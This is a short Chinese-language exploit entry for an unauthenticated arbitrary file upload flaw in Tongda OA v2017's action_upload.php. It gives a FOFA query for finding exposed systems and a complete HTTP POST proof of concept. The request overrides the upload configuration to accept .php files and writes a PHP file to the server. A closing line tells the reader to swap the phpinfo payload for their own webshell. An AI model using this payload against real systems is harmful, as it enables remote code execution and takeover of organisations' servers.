# **通达OA v2017 action_upload.php 任意文件上传漏洞**

## 漏洞描述

通达OA v2017 action_upload.php 文件过滤不足且无需后台权限，导致任意文件上传漏洞

## 漏洞影响

```
通达OA v2017
```

## FOFA

```
app="TDXK-通达OA" 
```

## poc

```
POST /module/ueditor/php/action_upload.php?action=uploadfile HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------157569659620694477453109954647
Content-Length: 879
Connection: close
Cookie: PHPSESSID=t0a1f7nd58egc83cnpv045iua4; KEY_RANDOMDATA=16407
Upgrade-Insecure-Requests: 1

-----------------------------157569659620694477453109954647
Content-Disposition: form-data; name="CONFIG[fileFieldName]"

ff
-----------------------------157569659620694477453109954647
Content-Disposition: form-data; name="CONFIG[fileMaxSize]"

1000000000
-----------------------------157569659620694477453109954647
Content-Disposition: form-data; name="CONFIG[filePathFormat]"

Api/conf
-----------------------------157569659620694477453109954647
Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"

.php
-----------------------------157569659620694477453109954647
Content-Disposition: form-data; name="ff"; filename="xxx.php"
Content-Type: text/plain

<?php phpinfo();?>

-----------------------------157569659620694477453109954647
Content-Disposition: form-data; name="mufile"

submit
-----------------------------157569659620694477453109954647--
```

使用时将`<?php phpinfo();?>`替换为你的webshell即可。